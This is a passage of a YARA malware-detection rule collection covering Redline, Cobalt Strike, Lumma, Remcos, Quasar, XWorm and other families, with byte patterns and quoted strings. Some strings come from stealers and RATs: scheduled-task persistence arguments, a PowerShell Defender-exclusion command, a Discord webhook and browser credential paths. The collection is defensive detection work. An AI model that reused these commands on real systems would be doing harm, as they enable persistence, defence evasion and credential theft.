		hash = "0cc3a0f8b48ef8d8562b9cdf9c7cfe7f63faf43a5ac6dc6973dc8bf13b6c88cf"
		logic_hash = "77273ba3736baf2c197fb8b17de1e22ba8f2380f73f9114f324ef56bfa508654"
		score = 75
		quality = 75
		tags = ""

	strings:
		$s_1 = {   
				20 ?? ?? ?? ?? 											// ldc.i4
				2B 00       											// br.s
				28 ?? ?? ?? 2B 											// Call
				80 ?? ?? ?? 04 											// stsfld
				(20 ?? ?? ?? ?? 2B00 28 ?? ?? ?? 2B | 72 ?? ?? ?? 70)   // ldc.i4, br.s, call OR ldstr
				80 ?? ?? ?? 04      									// Call
				(20 ?? ?? ?? ?? 2B00 28 ?? ?? ?? 2B | 72 ?? ?? ?? 70)   // ldc.i4, br.s, call OR ldstr
				80 ?? ?? ?? 04 											// Call		
				20 ?? ?? ?? ?? 											// ldc.i4
				2B00            										// br.s
				28 ?? ?? ?? 2B      									// Call
				80 ?? ?? ?? 04 											// stsfld
				2A 														// ret
			}
		$s_2 = "mscoree.dll"

	condition:
		$s_1 and $s_2
}
rule EMBEERESEARCH_Win_Redline_Loader_Dec_2023
{
	meta:
		description = "Patterns observed in redline loader"
		author = "Matthew @ Embee_Research"
		id = "59d933a8-8ccd-565f-b379-e0bf6c3d3111"
		date = "2023-12-24"
		modified = "2023-12-29"
		reference = "https://github.com/embee-research/Yara-detection-rules/"
		source_url = "https://github.com/embee-research/Yara-detection-rules//blob/ac56d6f6fd2a30c8cb6e5c0455d6519210a8b0f4/Rules/win_redline_loader_dec_2023.yar#L1-L20"
		license_url = "N/A"
		hash = ""
		logic_hash = "831c32f9998b97f7ceeb14df73a264a998df5f8800aaa5271755aaaeac070010"
		score = 75
		quality = 75
		tags = ""

	strings:
		$s1 = {8b ?? ?? 0c 30 04 31 46 3b f7 7c ?? 5d 5b 5e 83 ?? ?? 75}
		$s2 = "WritePrivateProfileStringA"
		$s3 = "SetFileShortNameA"
		$s4 = "- Attempt to use MSIL code from this assembly during native code initialization"

	condition:
		all of them
}
rule EMBEERESEARCH_Win_Cobalt_Strike_Loader_Shellcode_Jun_2023 : FILE
{
	meta:
		description = "Detection of an encoder observed with Cobalt Strike shellcode"
		author = "Matthew @ Embee_research"
		id = "ea52b9e7-f2bd-5c9f-9ee1-506baa48be84"
		date = "2023-07-03"
		modified = "2023-07-03"
		reference = "https://github.com/embee-research/Yara-detection-rules/"
		source_url = "https://github.com/embee-research/Yara-detection-rules//blob/ac56d6f6fd2a30c8cb6e5c0455d6519210a8b0f4/Rules/win_cobalt_shellcode_encoder_jun_2023.yar#L1-L21"
		license_url = "N/A"
		logic_hash = "42b4b9ab681f3164168de84e76bcd8161865fa9e5871d70a6de534b23896e4f0"
		score = 75
		quality = 75
		tags = "FILE"
		vendor = ""

	strings:
		$get_enc_offset = {8b 88 c0 00 00 00 8b 90 c4 00 00 00 48 8d b0 c8 00 00 00}
		$decode_loop = {ac 83 e1 03 d2 c8 ff c1 aa ff ca 75 f3}
		$b64_initial_bytes = "SInISIlMJAiLiMAAAACLkMQAAABIjbDIAAAA" wide ascii

	condition:
		(( $get_enc_offset and $decode_loop ) or $b64_initial_bytes ) and filesize < 10000KB
}

rule EMBEERESEARCH_Win_Icedid_Snowloader_Bytecodes_Oct_2023
{
	meta:
		description = "No description has been set in the source file - EmbeeResearch"
		author = "Matthew @ Embee_Research"
		id = "ad5d7bf5-813d-519d-91ae-e6a69fd557df"
		date = "2023-08-27"
		modified = "2023-10-18"
		reference = "https://github.com/embee-research/Yara-detection-rules/"
		source_url = "https://github.com/embee-research/Yara-detection-rules//blob/ac56d6f6fd2a30c8cb6e5c0455d6519210a8b0f4/Rules/win_icedid_snowloader_bytecodes_oct_2023.yar#L2-L23"
		license_url = "N/A"
		hash = "e096de90f65ff83ed0e929b330aa765a8e2322625325fb042775bff1748467cc"
		hash = "e87928fcddf13935c91a0b5577e28efd29bb6a5c1d98e5129dec63e231601053"
		hash = "82a01607ebdcaa73b9ff201ccb76780ad8de4a99dd3df026dcb71b0f007456ed"
		logic_hash = "5baa308ce130cbbe80f94fc127b083f26ae87552910c2bc6f3bae3008cf1aa63"
		score = 75
		quality = 75
		tags = ""

	strings:
		$s_1 = {4c 77 26 07}
		$s_2 = {58 a4 53 e5}
		$s_3 = {10 e1 8a c3}

	condition:
		( all of ( $s* ) ) and pe.number_of_exports > 20
}
rule EMBEERESEARCH_Win_Darkgate_Xllloader_Oct_2023
{
	meta:
		description = "Detects XLL Files Related to DarkGate"
		author = "Matthew @ Embee_Research"
		id = "4b5d9a2d-90ee-5452-83be-1677e1888045"
		date = "2023-10-03"
		modified = "2023-10-04"
		reference = "https://github.com/embee-research/Yara-detection-rules/"
		source_url = "https://github.com/embee-research/Yara-detection-rules//blob/ac56d6f6fd2a30c8cb6e5c0455d6519210a8b0f4/Rules/win_darkgate_xll_loader_oct_2023.yar#L2-L23"
		license_url = "N/A"
		hash = "091b7c16791cf976e684fe22ee18a4099a4e26ec75fa145b85dd14603b466b00"
		hash = "305de78353b0d599cd40a73c7e639df7f5946d1fc36691c8f7798a99ee6835e7"
		hash = "98c59262ad396b4da5b0a3e82f819923f860e974f687c4fff9b852f25a56c50f"
		hash = "27ec297e1fc34e29963303782ff881e74f8bd4126f4c5be0c4754f745d85f79a"
		hash = "392fd4d218a8e333bc422635e48fdfae59054413c7a6be764c0275752d45ab23"
		hash = "9a34b32d0a66dd4f59aeea82ef48f335913c47c6ca901ab109df702cd166892f"
		logic_hash = "ea9a166550c53225b0a06e2cd86760f63aed8973e889a457470bdba3d87ce6af"
		score = 75
		quality = 75
		tags = ""

	strings:
		$s1 = "xlAutoOpen" wide ascii
		$s2 = { 49 ?? ?? 4c ?? ?? 48 ?? ?? 48 ?? ?? 02 e8 ?? ?? ?? ?? 48 ?? ?? 31 ?? 48 ?? ?? 01 48 ?? ?? 41 ?? ?? ?? ?? 30 ?? 48 ?? ?? 01 49 ?? ?? 75 ?? }

	condition:
		( all of ( $s* ) )
}

rule EMBEERESEARCH_Win_Solarmarker_Bytecodes : FILE
{
	meta:
		description = "Detects bytecodes present in solarmarker Packer"
		author = "Matthew @ Embee_Research"
		id = "d405e7ae-f09b-5993-a510-e5e1bc289898"
		date = "2023-09-10"
		modified = "2023-09-11"
		reference = "https://github.com/embee-research/Yara-detection-rules/"
		source_url = "https://github.com/embee-research/Yara-detection-rules//blob/ac56d6f6fd2a30c8cb6e5c0455d6519210a8b0f4/Rules/win_solarmarker_bytecodes_aug_2023.yar#L3-L21"
		license_url = "N/A"
		hash = "a433dad1e31f2e19ab5d22b6348c73fa4c874502acc20d5517d785b554754279"
		logic_hash = "52256184706b7173ee8e8683ac79c1b9d4773778c135e4dae255376c0a6651fb"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = {8C ?? ?? ?? ?? 28 ?? ?? ?? ?? 0A 20 ?? ?? ?? ?? 13 ?? 06 11 ?? 20 ?? ?? ?? ?? 58 D1 8C ?? ?? ?? ?? 28 ?? ?? ?? ?? 0A 20 ?? ?? ?? ?? 13 ?? 06 11 ?? 20 ?? ?? ?? ?? 58 D1 8C ?? ?? ?? ?? 28 ?? ?? ?? ??}

	condition:
		dotnet.is_dotnet and filesize < 7000KB and $s1
}
rule EMBEERESEARCH_Win_Marsstealer_Encryption_Bytecodes
{
	meta:
		description = "Encryption observed in MarsStealer"
		author = "Matthew @ Embee_Research"
		id = "7a66ea9c-966e-5780-8b36-a268904b9c1b"
		date = "2023-12-24"
		modified = "2023-12-24"
		reference = "https://github.com/embee-research/Yara-detection-rules/"
		source_url = "https://github.com/embee-research/Yara-detection-rules//blob/ac56d6f6fd2a30c8cb6e5c0455d6519210a8b0f4/Rules/win_marsStealer_encryption_bytecodes_dec_2023.yar#L1-L16"
		license_url = "N/A"
		hash = "7a391340b6677f74bcf896b5cc16a470543e2a384049df47949038df5e770df1"
		logic_hash = "49ffde28c8823c00959ddbaa516fc48c7908b533c8f91608b0e3a645045c9048"
		score = 75
		quality = 75
		tags = ""

	strings:
		$s1 = {31 2d 3d 31 73 30 02 39 c0 74 0a 5b 70 61 73 64 6c 30 71 77 69 8d 5b 01 8d 52 01 39 eb 75 03 83 eb 20 39 ca}

	condition:
		$s1
}

rule EMBEERESEARCH_Win_Exela_Stealer_Simple_Strings_Sep_2023
{
	meta:
		description = "No description has been set in the source file - EmbeeResearch"
		author = "Matthew @embee_research"
		id = "e63aa1d3-997e-5200-93fc-869c177fe1a8"
		date = "2023-09-24"
		modified = "2023-09-26"
		reference = "https://github.com/embee-research/Yara-detection-rules/"
		source_url = "https://github.com/embee-research/Yara-detection-rules//blob/ac56d6f6fd2a30c8cb6e5c0455d6519210a8b0f4/Rules/win_exela_stealer_simple_strings_sep_2023.yar#L4-L32"
		license_url = "N/A"
		hash = "bf5d70ca2faf355d86f4b40b58032f21e99c3944b1c5e199b9bb728258a95c1b"
		logic_hash = "2312b63fe86fd34eb12f42f079f470eb3af27ef8c199f3620253c828ad28441a"
		score = 75
		quality = 75
		tags = ""

	strings:
		$s1 = "https://i.instagram.com/api/v1/accounts/current_user/" wide
		$s2 = "/create /f /sc onlogon /rl highest /tn \"AutoUpdateCheckerOnLogon\" /tr " wide
		$s4 = "https://discord.com/api/webhooks/" wide
		$s5 = "Browser : {0} | Name : {1} | Value : {2} | Date created (timestamp) : {3} |  Date last used (timestamp) : {4} | Count {5}" wide
		$s6 = "Browser : {0} | {1} {2}/{3} {4}" wide
		$e1 = "Exela.Program" wide ascii
		$e2 = "Exela.Wifi" wide ascii
		$e3 = "Exela.Components" wide ascii
		$e4 = "Exela Stealer" wide ascii
		$e5 = "Exela.exe" wide ascii

	condition:
		dotnet.is_dotnet and ( ( all of ( $s* ) ) or ( 3 of ( $e* ) ) )
}
rule EMBEERESEARCH_Win_Berbew_Strings_Dec_2023
{
	meta:
		description = "Strings observed in Berbew malware."
		author = "Matthew @ Embee_Research"
		id = "402711af-c543-5c95-ae9e-e663825b6653"
		date = "2023-12-24"
		modified = "2023-12-26"
		reference = "https://github.com/embee-research/Yara-detection-rules/"
		source_url = "https://github.com/embee-research/Yara-detection-rules//blob/ac56d6f6fd2a30c8cb6e5c0455d6519210a8b0f4/Rules/win_berbew_strings_dec_2023.yar#L1-L19"
		license_url = "N/A"
		hash = "24dc0af3c51118697df999d8bffcdfc9cbf0d07f2630473450dd826a1ae4b9ae"
		logic_hash = "a7f687e749ec69961777063d52678461a8e288c80037fac051d7b1a5b568d9e8"
		score = 75
		quality = 75
		tags = ""

	strings:
		$s1 = "This KEWL STUFF was coded by V. V. PUPKIN"
		$s2 = "REAL CASH, REAL BITCHEZ"
		$s3 = "Please, enter your Card Number"

	condition:
		all of them
}
rule EMBEERESEARCH_Win_Redline_Bytecodes_Jan_2024 : FILE
{
	meta:
		description = "Bytecodes found in late 2023 Redline malware"
		author = "Matthew @ Embee_Research"
		id = "8acf0fbb-f7d1-5a3d-9ccb-ee21926d6a31"
		date = "2023-08-27"
		modified = "2024-01-02"
		reference = "https://github.com/embee-research/Yara-detection-rules/"
		source_url = "https://github.com/embee-research/Yara-detection-rules//blob/ac56d6f6fd2a30c8cb6e5c0455d6519210a8b0f4/Rules/win_redline_bytecodes_jan_2024.yar#L1-L22"
		license_url = "N/A"
		hash = "ea1271c032046d482ed94c6d2c2c6e3ede9bea57dff13156cabca42b24fb9332"
		logic_hash = "43f4d718611c16983071587c2806f92550ebba6bae737c59c63cd8584a5cc01f"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = {00 00 7E ?? ?? ?? 04 7E ?? ?? ?? 04 28 ?? ?? ?? 06 17 8D ?? ?? ?? 01 25 16 1F 7C 9D 6F ?? ?? ?? 0A 13 ?? 16 13 ?? 38 }
		$s2 = "mscoree.dll" ascii

	condition:
		$s1 and $s2 and uint16( 0 ) == 0x5a4d
}

rule EMBEERESEARCH_Win_Njrat_Bytecodes_V2_Oct_2023
{
	meta:
		description = ""
		author = "Matthew @ Embee_Research"
		id = "9090574e-7ad4-5207-af8b-7b56f2a1c917"
		date = "2023-10-03"
		modified = "2023-10-08"
		reference = "https://github.com/embee-research/Yara-detection-rules/"
		source_url = "https://github.com/embee-research/Yara-detection-rules//blob/ac56d6f6fd2a30c8cb6e5c0455d6519210a8b0f4/Rules/win_njrat_bytecodes_v2_oct_2023.yar#L5-L27"
		license_url = "N/A"
		hash = "9877fc613035d533feda6adc6848e183bf8c8660de3a34b1acd73c75e62e2823"
		hash = "40f07bdfb74e61fe7d7973bcd4167ffefcff2f8ba2ed6f82e9fcb5a295aaf113"
		logic_hash = "0bdbf5715e3873d96c88a24ba08487af2b798d26cdcd3e35d783ce4828dae775"
		score = 75
		quality = 75
		tags = ""

	strings:
		$s1 = {03 1F 72 2E ?? 03 1F 73 2E ?? 03 1F 74 2E ?? 03 1F 75 2E ?? 03 1F 76 2E ?? }
		$s2 = {0B 14 0C 16 0D 16 13 ?? 16 13 ?? 14}

	condition:
		dotnet.is_dotnet and ( all of ( $s* ) )
}
rule EMBEERESEARCH_Win_Lumma_Simple_Strings : FILE
{
	meta:
		description = ""
		author = "Matthew @ Embee_Research"
		id = "d949d547-a2ee-56d9-8510-74f3b718b2c0"
		date = "2023-09-13"
		modified = "2023-09-21"
		reference = "https://github.com/embee-research/Yara-detection-rules/"
		source_url = "https://github.com/embee-research/Yara-detection-rules//blob/ac56d6f6fd2a30c8cb6e5c0455d6519210a8b0f4/Rules/win_lumma _simple_sep_2023.yar#L1-L40"
		license_url = "N/A"
		hash = "277d7f450268aeb4e7fe942f70a9df63aa429d703e9400370f0621a438e918bf"
		logic_hash = "0b3cb6721d26b79afe892b1c4df5e54c18cd7a5492aeacd442deca6b9b926f3c"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "Binedx765ance Chaedx765in Waledx765let" wide
		$s2 = "%appdaedx765ta%\\Moedx765zilla\\Firedx765efox\\Profedx765iles"
		$s3 = "\\Locedx765al Extensedx765ion Settinedx765gs\\"
		$s4 = "%appdedx765ata%\\Opedx765era Softwedx765are\\Opedx765era GX Staedx765ble"
		$o1 = {57 00 ?? 00 ?? 00 ?? 00 ?? 00 ?? 00 ?? 00 65 00 62 00 20 00 44 00 61 00 ?? 00 ?? 00 ?? 00 ?? 00 ?? 00 ?? 00 74 00 61 00}
		$o2 = {4f 00 70 00 ?? 00 ?? 00 ?? 00 ?? 00 ?? 00 ?? 00 65 00 72 00 61 00 20 00 4e 00 65 00 6f 00 ?? 00 ?? 00 ?? 00 ?? 00 ?? 00 ?? 00 6e 00}
		$o3 = {4c 00 6f 00 ?? 00 ?? 00 ?? 00 ?? 00 ?? 00 ?? 00 67 00 69 00 6e 00 20 00 44 00 61 00 ?? 00 ?? 00 ?? 00 ?? 00 ?? 00 ?? 00 74 00 61 00}

	condition:
		uint16( 0 ) == 0x5a4d and filesize < 5000KB and ( ( all of ( $s* ) ) or ( all of ( $o* ) ) )
}
rule EMBEERESEARCH_Win_Remcos_Rat_Unpacked : FILE
{
	meta:
		description = "Detects strings present in remcos rat Samples."
		author = "Matthew @ Embee_Research"
		id = "d4282638-592a-5c07-b07b-937e2a7879e4"
		date = "2023-08-27"
		modified = "2023-10-18"
		reference = "https://github.com/embee-research/Yara-detection-rules/"
		source_url = "https://github.com/embee-research/Yara-detection-rules//blob/ac56d6f6fd2a30c8cb6e5c0455d6519210a8b0f4/Rules/win_remcos_rat_unpacked_aug_2023.yar#L2-L32"
		license_url = "N/A"
		hash = "ec901217558e77f2f449031a6a1190b1e99b30fa1bb8d8dabc3a99bc69833784"
		logic_hash = "c6d1772a5517b104de3022f4bab55d92784d35c3a252a4e0516083d8bd28cad0"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$r0 = " ______                              " ascii
		$r1 = "(_____ \\                             " ascii
		$r2 = " _____) )_____ ____   ____ ___   ___ " ascii
		$r3 = "|  __  /| ___ |    \\ / ___) _ \\ /___)" ascii
		$r4 = "| |  \\ \\| ____| | | ( (__| |_| |___ |" ascii
		$r5 = "|_|   |_|_____)_|_|_|\\____)___/(___/ " ascii
		$s1 = "Watchdog module activated" ascii
		$s2 = "Remcos restarted by watchdog!" ascii
		$s3 = " BreakingSecurity.net" ascii

	condition:
		(( all of ( $r* ) ) or ( all of ( $s* ) ) )
}

rule EMBEERESEARCH_Win_Quasar_Rat_Client : FILE
{
	meta:
		description = "Detects strings present in Quasar Rat Samples."
		author = "Matthew @ Embee_Research"
		id = "7fc0bd6d-e187-51b7-a8b8-68b17271cef8"
		date = "2023-08-27"
		modified = "2023-10-18"
		reference = "https://github.com/embee-research/Yara-detection-rules/"
		source_url = "https://github.com/embee-research/Yara-detection-rules//blob/ac56d6f6fd2a30c8cb6e5c0455d6519210a8b0f4/Rules/win_quasar_rat_client_aug_2023.yar#L3-L37"
		license_url = "N/A"
		hash = "914d88f295ac2213f37d3f71e6d4383979283d1728079a208f286effb44d840c"
		hash = "45a724179ae1d08044c4bafb69c7f9cdb4ed35891dc9cf24aa664d75464ceb6d"
		hash = "7e13bcd73232c3f33410aa95f61e1196a2f9ae35e05c1f9c8f251e07077a9dfb"
		logic_hash = "efba911780ffb144f277e88ff8ca8f53a90c32a677ccb19ec26e71f974a1b91f"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "Quasar Client" ascii wide
		$s2 = "Quasar.Client.Properties.Resources" ascii wide
		$s3 = "Google\\Chrome\\User Data\\Default\\" wide
		$s4 = "\\Mozilla\\Firefox\\Profiles" wide
		$s5 = "Yandex\\YandexBrowser\\User Data\\Default\\" wide

	condition:
		uint16( 0 ) == 0x5a4d and dotnet.is_dotnet and filesize < 7000KB and ( for any i in ( 0 .. dotnet.number_of_resources -1 ) : ( dotnet.resources [ i ] . name == "Quasar.Client*" ) or ( 3 of ( $s* ) ) )
}
rule EMBEERESEARCH_Win_Redline_Payload_Dec_2023
{
	meta:
		description = "Patterns observed in redline"
		author = "Matthew @ Embee_Research"
		id = "6208779a-69b2-55b5-9744-987575c00d96"
		date = "2023-12-24"
		modified = "2023-12-29"
		reference = "https://github.com/embee-research/Yara-detection-rules/"
		source_url = "https://github.com/embee-research/Yara-detection-rules//blob/ac56d6f6fd2a30c8cb6e5c0455d6519210a8b0f4/Rules/win_redline_payload_dec_2023.yar#L1-L16"
		license_url = "N/A"
		hash = "5790aead07ce0b9b508392b9a2f363ef77055ae16c44231773849c87a1dd15a4"
		logic_hash = "d016baa5017120a3037e9cef7fd649228f7be60e511ecbdedf97916f59eec881"
		score = 75
		quality = 75
		tags = ""

	strings:
		$s1 = {16 72 ?? ?? ?? 70 A2 7E ?? ?? ?? 04 17 72 ?? ?? ?? 70 7E ?? ?? ?? 04 16 9A 28 ?? ?? ?? 06 A2 7E ?? ?? ?? 04 18 72 ?? ?? ?? 70 }

	condition:
		all of them
}
rule EMBEERESEARCH_Win_Stealc_Bytecodes_Oct_2023
{
	meta:
		description = "Bytecodes present in Stealc decoding routine"
		author = "Matthew @ Embee_Research"
		id = "ecac28a0-cd77-5e6a-8af2-59ea62e733bf"
		date = "2023-08-27"
		modified = "2023-10-09"
		reference = "https://github.com/embee-research/Yara-detection-rules/"
		source_url = "https://github.com/embee-research/Yara-detection-rules//blob/ac56d6f6fd2a30c8cb6e5c0455d6519210a8b0f4/Rules/win_stealc_bytecodes_oct_2023.yar#L2-L21"
		license_url = "N/A"
		hash = "74ff68245745b9d4cec9ef3c539d8da15295bdc70caa6fdb0632acdd9be4130a"
		hash = "9f44a4cbc30e7a05d7eb00b531a9b3a4ada5d49ecf585b48892643a189358526"
		logic_hash = "d50f57e32a7f513d92625549fcd139b7fa1e478879283fd61426fcd19d03d296"
		score = 75
		quality = 75
		tags = ""

	strings:
		$s1 = {8b 4d f0 89 4d f8 8b 45 f8 c1 e0 03 33 d2 b9 06 00 00 00 f7 f1 8b e5 5d c2 04 00}

	condition:
		( all of ( $s* ) )
}
rule EMBEERESEARCH_Win_Ursnif_Patterns_Oct_2022
{
	meta:
		description = "No description has been set in the source file - EmbeeResearch"
		author = "Embee_Research @ Huntress"
		id = "2c8da2b7-63f2-5cce-86ab-8a88f50d0263"
		date = "2022-10-14"
		modified = "2023-06-14"
		reference = "https://github.com/embee-research/Yara-detection-rules/"
		source_url = "https://github.com/embee-research/Yara-detection-rules//blob/ac56d6f6fd2a30c8cb6e5c0455d6519210a8b0f4/Rules/win_ursnif_patterns_oct_2022.yar#L1-L14"
		license_url = "N/A"
		logic_hash = "241804ea3b7ac98071c533d9a98a45cdd0f7043f11994327c1f79e29f5fdce2c"
		score = 75
		quality = 75
		tags = ""

	strings:
		$ursnif = {41 c1 e8 02 45 33 d2 45 8b d9 45 85 c0 74 2f 48 2b ca 83 7c 24 28 00 8b 04 11 44 8b c8 74 0a 85 c0 75 06 44 8d 40 01}
		$script = "65,193,232,2,69,51,210,69,139,217,69,133,192,116,47,72,43,202,131,124,36,40,0,139,4,17,68,139,200,116,10,133,192,117,6,68,141,64,1"

	condition:
		any of them
}

rule EMBEERESEARCH_Win_Xworm_Simple_Strings
{
	meta:
		description = "Detects simple strings present in unobfuscated xworm"
		author = "Matthew @ Embee_Research"
		id = "8d5d8f07-72fa-596b-a3fc-1dee4b7fd058"
		date = "2023-08-30"
		modified = "2023-10-18"
		reference = "https://github.com/embee-research/Yara-detection-rules/"
		source_url = "https://github.com/embee-research/Yara-detection-rules//blob/ac56d6f6fd2a30c8cb6e5c0455d6519210a8b0f4/Rules/win_xworm_simple_strings_sep_2023.yar#L3-L29"
		license_url = "N/A"
		hash = "4459d95c0493d640ecc9453cf6a4f2b7538b1a7b95032f70803fc726b8e40422"
		hash = "820bb1a31f421b90ea51efc3e71cc720c8c2784fb1e882e732e8fafb8631a389"
		logic_hash = "f7df310b24b2078249cdb670ece71ebe30f985c92b3e44b6dcf0e37405a26bc3"
		score = 75
		quality = 75
		tags = ""

	strings:
		$x1 = "XWorm V" wide nocase
		$s1 = "/create /f /RL HIGHEST /sc minute /mo 1 /tn " wide
		$s2 = "/create /f /sc minute /mo 1 /tn " wide
		$s3 = "-ExecutionPolicy Bypass Add-MpPreference -ExclusionPath " wide

	condition:
		dotnet.is_dotnet and $x1 and ( 2 of ( $s* ) )
}
rule EMBEERESEARCH_Win_Solarmarker_Stage2_Bytecodes_Dec_2023
{
	meta:
		description = "Patterns observed in Solarmarker stage2 dll"
		author = "Matthew @ Embee_Research"
		id = "9aba6cdf-1491-579d-b4a7-fe229272015d"
		date = "2023-12-28"
		modified = "2023-12-28"
		reference = "https://github.com/embee-research/Yara-detection-rules/"
		source_url = "https://github.com/embee-research/Yara-detection-rules//blob/ac56d6f6fd2a30c8cb6e5c0455d6519210a8b0f4/Rules/win_solarmarker_stage2_bytecodes_dec_2023.yar#L1-L20"
		license_url = "N/A"
		hash = "4a3b60496a793ee96a51fecf8690ef8312429a6b54d32f2a4424395c47b47fc8"
		hash = "e0b2457491a8c2d50710aa343ad1957a76f83ceaf680165ffa0e287fe18abbd6"
		logic_hash = "8e50e5942f0029ffda1d9750f8cc8e004a2512e50b6a14c1619ae0b83477a944"
		score = 75
		quality = 75
		tags = ""

	strings:
		$s1 = {6F ?? ?? 00 0A 1F 20 2E ?? 02 7B ?? ?? 00 04 02 7B ?? ?? 00 04 6F ?? ?? 00 0A 1F 09 2E ?? 02 7B ?? ?? 00 04 02 7B ?? ?? 00 04 6F ?? ?? 00 0A 1F 0A 2E ?? 02 7B ?? ?? 00 04 02 7B ?? ?? 00 04 6F ?? ?? 00 0A 1F 0D 2E ?? 02 7B ?? ?? 00 04 02 7B ?? ?? 00 04 6F ?? ?? 00 0A 1F 0A }

	condition:
		$s1
}

rule EMBEERESEARCH_Win_Njrat_Bytecodes_Oct_2023
{
	meta:
		description = ""
		author = "Matthew @ Embee_Research"
		id = "9e39587a-e878-5f99-806f-e9964952f0ac"
		date = "2023-10-03"
		modified = "2023-10-03"
		reference = "https://github.com/embee-research/Yara-detection-rules/"
		source_url = "https://github.com/embee-research/Yara-detection-rules//blob/ac56d6f6fd2a30c8cb6e5c0455d6519210a8b0f4/Rules/win_njrat_bytecodes_oct_2023.yar#L3-L22"
		license_url = "N/A"
		hash = "59d6e2958780d15131c102a93fefce6e388e81da7dc78d9c230aeb6cab7e3474"
		hash = "4c56ade4409add1d78eac3b202a9fbd6afbd71878c31f798026082467ace2628"
		hash = "d5a78790a1b388145424327e78f019584466d30d2d450bba832c0128aa3cd274"
		logic_hash = "7df39219e2f2da55e461b1536e92ab125d488a048e41daaaa1fb9516be395d10"
		score = 75
		quality = 75
		tags = ""

	strings:
		$s1 = {14 80 ?? ?? ?? ?? 16 80 ?? ?? ?? ?? 72 ?? ?? ?? ?? 80 ?? ?? ?? ?? 14 80 ?? ?? ?? ?? 73 ?? ?? ?? ?? 80 ?? ?? ?? ?? 20 ?? ?? ?? ?? 8D ?? ?? ?? ?? 80 ?? ?? ?? ?? 72 ?? ?? ?? ?? 80 ?? ?? ?? ?? 14 80 ?? ?? ?? ?? 2A }

	condition:
		dotnet.is_dotnet and $s1
}
rule EMBEERESEARCH_Win_Pikabot_Loader_Bytecodes_Oct_2023
{
	meta:
		description = "Detects bytecodes in recent PikaBot Loaders"
		author = "Matthew @ Embee_Research"
		id = "c15b9390-1d20-5325-81c3-c6cf59ffb21f"
		date = "2023-10-03"
		modified = "2023-10-08"
		reference = "https://github.com/embee-research/Yara-detection-rules/"
		source_url = "https://github.com/embee-research/Yara-detection-rules//blob/ac56d6f6fd2a30c8cb6e5c0455d6519210a8b0f4/Rules/win_pikabot_loader_bytecodes_oct_2023.yar#L3-L24"
		license_url = "N/A"
		hash = "778b6797bb9c9d2f868d3faaaf6b36ce3f06178c133bb592c5345c95ffb034a9"
		hash = "e26d44d740b4edbd37fa6196dcc9171e49e711d8ce64f67aae36c4299e352108"
		hash = "2d212cacc4767ef4383bdf462a9bb8aaf87f0b3c55b4c2f4a47c97c710ec1cd8"
		logic_hash = "a078df39fda5ab6f432c4bf42fb61bdf106386d9684188189e3cea81803b3952"
		score = 75
		quality = 75
		tags = ""

	strings:
		$s1 = { 8b 59 64 a1 58 00 ?? ?? 8b 8e d0 00 00 00 2b c1 2d d9 f1 3e 41 0f af da 09 46 20 a1 34 dd ?? ?? 8b d3 2b 88 a0 00 00 00 2b 0d bc ff ?? ?? 81}
		$s2 = { 88 14 08 8b cb 8b 15 a0 6a ?? ?? 42 c1 e9 08 89 15 a0 6a ?? ?? 8b 46 20 2b 05 ec 6a ?? ?? 05 ae 49 08 00}
		$s3 = { 03 d8 43 a1 d4 8e ?? ?? 33 18 89 1d 18 8f ?? ?? a1 d4 8e ?? ?? 8b 15 18 8f ?? ?? 89 10 8b 45 f8 83 c0 04 89 45 f8 33 c0 a3 14 8f ?? ?? a1 d4 8e ?? ?? 83 c0 04 03 05 14 8f ?? ?? a3 d4 8e ?? ?? 8b 45 f8 3b 05 e0 8e ?? ?? }

	condition:
		$s1 or $s2 or $s3
}
rule EMBEERESEARCH_Win_Gracewire_Loader_Dec_2022 : FILE
{
	meta:
		description = "Yara rule to detect GraceWireLoader via usage of Stack Strings"
		author = "Embee_Research @ Huntress"
		id = "63d0cd9f-34f7-5ec4-8061-66d36859bd0c"
		date = "2022-12-12"
		modified = "2023-10-18"
		reference = "https://github.com/embee-research/Yara-detection-rules/"
		source_url = "https://github.com/embee-research/Yara-detection-rules//blob/ac56d6f6fd2a30c8cb6e5c0455d6519210a8b0f4/Rules/2022/win_gracewire_loader_dec_2022.yar#L2-L24"
		license_url = "N/A"
		logic_hash = "168af6d24c0646e90717f27e6ba4a18da8e92950ffa7a881243860305037da48"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$ZwAllocateVirtualMemory = {c6 44 24 48 5a c6 44 24 49 77 c6 44 24 4a 41 c6 44 24 4b 6c c6 44 24 4c 6c c6 44 24 4d 6f c6 44 24 4e 63 c6 44 24 4f 61 c6 44 24 50 74 c6 44 24 51 65 c6 44 24 52 56 c6 44 24 53 69 c6 44 24 54 72 c6 44 24 55 74 c6 44 24 56 75 c6 44 24 57 61 c6 44 24 58 6c c6 44 24 59 4d c6 44 24 5a 65 c6 44 24 5b 6d c6 44 24 5c 6f}
		$LdrGetProcedureAddress = {c6 44 24 50 4c c6 44 24 51 64 c6 44 24 52 72 c6 44 24 53 47 c6 44 24 54 65 c6 44 24 55 74 c6 44 24 56 50 c6 44 24 57 72 c6 44 24 58 6f c6 44 24 59 63 c6 44 24 5a 65 c6 44 24 5b 64 c6 44 24 5c 75 c6 44 24 5d 72 c6 44 24 5e 65 c6 44 24 5f 41 c6 44 24 60 64 c6 44 24 61 64 c6 44 24 62 72 c6 44 24 63 65 c6 44 24 64 73 c6 44 24 65 73 c6 44 24 66 00}
		$LdrLoadDLL = {c6 44 24 50 4c c6 44 24 51 64 c6 44 24 52 72 c6 44 24 53 4c c6 44 24 54 6f c6 44 24 55 61 c6 44 24 56 64 c6 44 24 57 44 c6 44 24 58 6c c6 44 24 59 6c}
		$ZwFreeVirtualMemory = {c6 44 24 30 5a c6 44 24 31 77 c6 44 24 32 46 c6 44 24 33 72 c6 44 24 34 65 c6 44 24 35 65 c6 44 24 36 56 c6 44 24 37 69 c6 44 24 38 72 c6 44 24 39 74 c6 44 24 3a 75 c6 44 24 3b 61 c6 44 24 3c 6c c6 44 24 3d 4d c6 44 24 3e 65 c6 44 24 3f 6d c6 44 24 40 6f c6 44 24 41 72 c6 44 24 42 79}

	condition:
		3 of them
}
rule EMBEERESEARCH_Win_Emotet_String_Patterns_Oct_2022 : FILE
{
	meta:
		description = "Detection of string hashing routines observed in emotet"
		author = "Embee_Research @ HuntressLabs"
		id = "fd9c3133-95dc-5dd8-9e94-ed85ad8e1fc7"
